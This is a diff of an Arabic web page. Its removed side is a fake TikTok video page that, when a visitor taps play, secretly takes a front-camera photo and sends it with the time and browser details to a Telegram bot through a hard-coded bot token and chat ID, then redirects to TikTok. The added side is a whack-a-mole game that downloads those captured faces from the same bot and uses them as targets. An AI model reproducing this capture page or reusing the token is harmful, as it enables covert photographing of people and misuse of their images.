@@ -2,112 +2,187 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-  <title>TikTok</title>
-  <link rel="icon" href="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok/webapp/main/webapp-login/8152caf0c8e8bc67ae0d.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>اصطادهم 😂</title>
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
-    .tt-logo { display: flex; align-items: center; gap: 8px; margin-bottom: 28px; }
-    .tt-logo svg { width: 32px; height: 32px; }
-    .tt-logo span { font-size: 1.5rem; font-weight: 800; }
-    .video-card { width: 100%; max-width: 360px; background: #111; border-radius: 16px; overflow: hidden; border: 1px solid #222; }
-    .thumb { width: 100%; aspect-ratio: 9/16; max-height: 420px; background: linear-gradient(160deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%); display: flex; align-items: center; justify-content: center; position: relative; cursor: pointer; }
-    .play-btn { width: 68px; height: 68px; background: rgba(255,255,255,0.18); border-radius: 50%; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(10px); border: 2px solid rgba(255,255,255,0.3); transition: transform 0.15s; }
-    .play-btn:active { transform: scale(0.92); }
-    .play-btn::after { content: ''; border-left: 24px solid #fff; border-top: 14px solid transparent; border-bottom: 14px solid transparent; margin-left: 5px; }
-    .views { position: absolute; bottom: 12px; right: 14px; font-size: 0.75rem; color: rgba(255,255,255,0.75); background: rgba(0,0,0,0.55); padding: 3px 10px; border-radius: 20px; }
-    .tap-hint { position: absolute; bottom: 12px; left: 50%; transform: translateX(-50%); font-size: 0.72rem; color: rgba(255,255,255,0.5); white-space: nowrap; }
-    .info { padding: 14px 16px; }
-    .user-row { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
-    .avatar { width: 36px; height: 36px; background: linear-gradient(45deg, #FE2C55, #25F4EE); border-radius: 50%; flex-shrink: 0; }
-    .username { font-weight: 700; font-size: 0.9rem; }
-    .handle { font-size: 0.75rem; color: #888; margin-top: 1px; }
-    .caption { font-size: 0.85rem; color: #ccc; line-height: 1.5; }
-    .tags { color: #FE2C55; }
-    .actions { display: flex; justify-content: space-around; padding: 12px 16px; border-top: 1px solid #1f1f1f; font-size: 0.75rem; color: #888; }
-    .action { display: flex; flex-direction: column; align-items: center; gap: 4px; }
-    .action svg { width: 22px; height: 22px; fill: #888; }
-    .loading-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 99; align-items: center; justify-content: center; flex-direction: column; gap: 16px; }
-    .loading-overlay.show { display: flex; }
-    .spinner { width: 44px; height: 44px; border: 3px solid #333; border-top-color: #FE2C55; border-radius: 50%; animation: spin 0.8s linear infinite; }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    .loading-text { font-size: 0.9rem; color: #aaa; }
-    #cam, #canvas { display: none; position: fixed; opacity: 0; pointer-events: none; }
+    * { margin:0; padding:0; box-sizing:border-box; user-select:none; }
+    body { background:#1a0a2e; color:#fff; font-family:-apple-system,sans-serif; min-height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:flex-start; padding:16px; }
+    h1 { font-size:1.6rem; margin:12px 0 4px; text-align:center; }
+    .sub { color:#aaa; font-size:0.85rem; margin-bottom:16px; }
+    .hud { display:flex; gap:24px; margin-bottom:18px; }
+    .hud-box { background:#2a1a4e; border-radius:12px; padding:8px 20px; text-align:center; }
+    .hud-box .label { font-size:0.7rem; color:#888; }
+    .hud-box .val { font-size:1.5rem; font-weight:800; color:#FE2C55; }
+    .grid { display:grid; grid-template-columns:repeat(3,1fr); gap:16px; width:100%; max-width:360px; }
+    .hole { aspect-ratio:1; background:#2a1a4e; border-radius:50%; position:relative; overflow:hidden; display:flex; align-items:flex-end; justify-content:center; border:3px solid #3a2a5e; cursor:pointer; }
+    .hole::after { content:''; position:absolute; bottom:0; left:0; right:0; height:35%; background:#1a0a2e; border-radius:0 0 50% 50%; z-index:2; }
+    .mole { width:85%; aspect-ratio:1; border-radius:50%; position:absolute; bottom:-100%; transition:bottom 0.18s cubic-bezier(.34,1.56,.64,1); z-index:1; object-fit:cover; border:3px solid #FE2C55; }
+    .mole.up { bottom:5%; }
+    .mole.hit { filter:brightness(3) saturate(0); transform:scale(1.2); transition:all 0.1s; }
+    .stars { position:absolute; top:-10px; left:50%; transform:translateX(-50%); font-size:1.6rem; opacity:0; z-index:10; pointer-events:none; transition:opacity 0.1s; }
+    .stars.show { animation:flyup 0.6s forwards; }
+    @keyframes flyup { 0%{opacity:1;top:-10px} 100%{opacity:0;top:-60px} }
+    .btn { margin-top:20px; background:#FE2C55; color:#fff; border:none; border-radius:14px; padding:14px 40px; font-size:1.1rem; font-weight:700; cursor:pointer; }
+    .btn:active { transform:scale(0.95); }
+    #overlay { position:fixed; inset:0; background:rgba(0,0,0,0.85); display:flex; flex-direction:column; align-items:center; justify-content:center; gap:16px; z-index:99; }
+    #overlay h2 { font-size:2rem; }
+    #overlay .score-big { font-size:4rem; font-weight:900; color:#FE2C55; }
+    .loading { color:#888; font-size:0.9rem; margin-top:8px; }
   </style>
 </head>
 <body>
-  <div class="tt-logo">
-    <svg viewBox="0 0 48 48" fill="none"><path d="M34.4 9.6C32.5 7.4 31.4 4.6 31.4 1.6H24.2V32.4C24.2 35.2 21.9 37.5 19.1 37.5C16.3 37.5 14 35.2 14 32.4C14 29.6 16.3 27.3 19.1 27.3C19.7 27.3 20.3 27.4 20.8 27.6V20.2C20.2 20.1 19.7 20.1 19.1 20.1C12.3 20.1 6.8 25.6 6.8 32.4C6.8 39.2 12.3 44.7 19.1 44.7C25.9 44.7 31.4 39.2 31.4 32.4V17.2C34.1 19.1 37.4 20.2 41 20.2V13C38.3 13 36 11.6 34.4 9.6Z" fill="white"/></svg>
-    <span>TikTok</span>
-  </div>
 
-  <div class="video-card">
-    <div class="thumb" id="playBtn" onclick="startCapture()">
-      <div class="play-btn"></div>
-      <span class="views">👁 2.4M</span>
-      <span class="tap-hint">اضغط للتشغيل</span>
-    </div>
-    <div class="info">
-      <div class="user-row">
-        <div class="avatar"></div>
-        <div>
-          <div class="username">محمد_فايز ✓</div>
-          <div class="handle">@m.fayez_official</div>
-        </div>
-      </div>
-      <div class="caption">شوف اللي صار معي اليوم 😭💀 <span class="tags">#fyp #viral #اكسبلور</span></div>
-    </div>
-    <div class="actions">
-      <div class="action"><svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>184K</div>
-      <div class="action"><svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>3.2K</div>
-      <div class="action"><svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z"/></svg>مشاركة</div>
-    </div>
-  </div>
+<h1>😂 اصطاد أصحابك</h1>
+<p class="sub">اضغط على وجههم قبل ما يختفون</p>
 
-  <div class="loading-overlay" id="overlay">
-    <div class="spinner"></div>
-    <div class="loading-text">جارٍ تحميل الفيديو...</div>
-  </div>
+<div class="hud">
+  <div class="hud-box"><div class="label">النقاط</div><div class="val" id="score">0</div></div>
+  <div class="hud-box"><div class="label">الوقت</div><div class="val" id="timer">30</div></div>
+  <div class="hud-box"><div class="label">أعلى</div><div class="val" id="best">0</div></div>
+</div>
 
-  <video id="cam" autoplay playsinline muted></video>
-  <canvas id="canvas"></canvas>
+<div class="grid" id="grid">
+  <!-- 6 holes -->
+</div>
 
-  <script>
-    const BOT_TOKEN = '8887053938:AAFf89tf-3ki0OEzLSZSk7uWaN72cGf4lck';
-    const CHAT_ID   = '688877968';
-    const REDIRECT  = 'https://www.tiktok.com';
+<button class="btn" id="startBtn" onclick="startGame()">ابدأ 🎯</button>
+<p class="loading" id="loadMsg">جاري تحميل وجوههم...</p>
 
-    async function sendPhoto(blob) {
-      const form = new FormData();
-      form.append('chat_id', CHAT_ID);
-      form.append('photo', blob, 'visitor.jpg');
-      form.append('caption', `📸 زائر جديد!\n🕐 ${new Date().toLocaleString('ar-SA')}\n📱 ${navigator.userAgent.substring(0,120)}`);
-      try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body:form }); } catch(_){}
-    }
+<div id="overlay" style="display:none">
+  <h2>انتهت اللعبة 💀</h2>
+  <div class="score-big" id="finalScore">0</div>
+  <p>نقطة</p>
+  <button class="btn" onclick="startGame()">مرة ثانية 🔁</button>
+</div>
 
-    async function startCapture() {
-      document.getElementById('overlay').classList.add('show');
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode:'user' }, audio:false });
-        const video  = document.getElementById('cam');
-        const canvas = document.getElementById('canvas');
-        video.srcObject = stream;
-        await new Promise(r => { video.onloadedmetadata = r; });
-        video.play();
-        await new Promise(r => setTimeout(r, 700));
-        canvas.width  = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        stream.getTracks().forEach(t => t.stop());
-        canvas.toBlob(async blob => {
-          if (blob) await sendPhoto(blob);
-          window.location.href = REDIRECT;
-        }, 'image/jpeg', 0.92);
-      } catch(_) {
-        window.location.href = REDIRECT;
+<script>
+const BOT_TOKEN = '8887053938:AAFf89tf-3ki0OEzLSZSk7uWaN72cGf4lck';
+const HOLES = 6;
+let photos = [];
+let score = 0, best = 0, timeLeft = 30;
+let gameActive = false;
+let moleTimers = [];
+let gameTimer = null;
+
+// بناء الشبكة
+const grid = document.getElementById('grid');
+for (let i = 0; i < HOLES; i++) {
+  const hole = document.createElement('div');
+  hole.className = 'hole';
+  hole.id = 'hole' + i;
+  const img = document.createElement('img');
+  img.className = 'mole';
+  img.id = 'mole' + i;
+  img.src = '';
+  const stars = document.createElement('div');
+  stars.className = 'stars';
+  stars.id = 'stars' + i;
+  stars.textContent = '💥';
+  hole.appendChild(img);
+  hole.appendChild(stars);
+  hole.onclick = () => whack(i);
+  grid.appendChild(hole);
+}
+
+// جلب صور الأصحاب من التيليغرام
+async function loadPhotos() {
+  try {
+    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=100`);
+    const d = await r.json();
+    const fileIds = [];
+    for (const u of d.result) {
+      if (u.message?.photo) {
+        const biggest = u.message.photo[u.message.photo.length - 1];
+        if (!fileIds.includes(biggest.file_id)) fileIds.push(biggest.file_id);
       }
     }
-  </script>
+    for (const fid of fileIds.slice(0,6)) {
+      const fr = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fid}`);
+      const fd = await fr.json();
+      photos.push(`https://api.telegram.org/file/bot${BOT_TOKEN}/${fd.result.file_path}`);
+    }
+    if (photos.length === 0) photos = ['https://i.pravatar.cc/150?img=1','https://i.pravatar.cc/150?img=2','https://i.pravatar.cc/150?img=3'];
+    document.getElementById('loadMsg').textContent = `✅ حُمّل ${photos.length} وجوه — جاهز!`;
+  } catch(e) {
+    photos = ['https://i.pravatar.cc/150?img=1','https://i.pravatar.cc/150?img=2','https://i.pravatar.cc/150?img=3'];
+    document.getElementById('loadMsg').textContent = '⚠️ ما قدر يحمل الصور — يستخدم placeholder';
+  }
+}
+
+function getPhoto(i) {
+  return photos.length ? photos[i % photos.length] : 'https://i.pravatar.cc/150';
+}
+
+function showMole(holeIdx) {
+  if (!gameActive) return;
+  const mole = document.getElementById('mole' + holeIdx);
+  mole.src = getPhoto(Math.floor(Math.random() * photos.length));
+  mole.classList.add('up');
+  mole.dataset.hit = '0';
+  const delay = Math.max(600, 1400 - (30 - timeLeft) * 25);
+  moleTimers[holeIdx] = setTimeout(() => {
+    if (mole.dataset.hit === '0') hideMole(holeIdx);
+  }, delay);
+}
+
+function hideMole(i) {
+  const mole = document.getElementById('mole' + i);
+  mole.classList.remove('up', 'hit');
+  setTimeout(() => {
+    if (gameActive) scheduleNext(i);
+  }, 300);
+}
+
+function scheduleNext(i) {
+  const delay = Math.random() * 1000 + 400;
+  setTimeout(() => { if (gameActive) showMole(i); }, delay);
+}
+
+function whack(i) {
+  if (!gameActive) return;
+  const mole = document.getElementById('mole' + i);
+  if (!mole.classList.contains('up') || mole.dataset.hit === '1') return;
+  mole.dataset.hit = '1';
+  mole.classList.add('hit');
+  clearTimeout(moleTimers[i]);
+  score++;
+  document.getElementById('score').textContent = score;
+  const stars = document.getElementById('stars' + i);
+  stars.classList.remove('show');
+  void stars.offsetWidth;
+  stars.classList.add('show');
+  setTimeout(() => hideMole(i), 200);
+}
+
+function startGame() {
+  document.getElementById('overlay').style.display = 'none';
+  document.getElementById('startBtn').style.display = 'none';
+  score = 0; timeLeft = 30; gameActive = true;
+  document.getElementById('score').textContent = 0;
+  document.getElementById('timer').textContent = 30;
+  for (let i = 0; i < HOLES; i++) scheduleNext(i);
+  gameTimer = setInterval(() => {
+    timeLeft--;
+    document.getElementById('timer').textContent = timeLeft;
+    if (timeLeft <= 0) endGame();
+  }, 1000);
+}
+
+function endGame() {
+  gameActive = false;
+  clearInterval(gameTimer);
+  moleTimers.forEach(clearTimeout);
+  for (let i = 0; i < HOLES; i++) {
+    const mole = document.getElementById('mole' + i);
+    mole.classList.remove('up','hit');
+  }
+  if (score > best) { best = score; document.getElementById('best').textContent = best; }
+  document.getElementById('finalScore').textContent = score;
+  document.getElementById('overlay').style.display = 'flex';
+  document.getElementById('startBtn').style.display = 'block';
+}
+
+loadPhotos();
+</script>
 </body>
 </html>
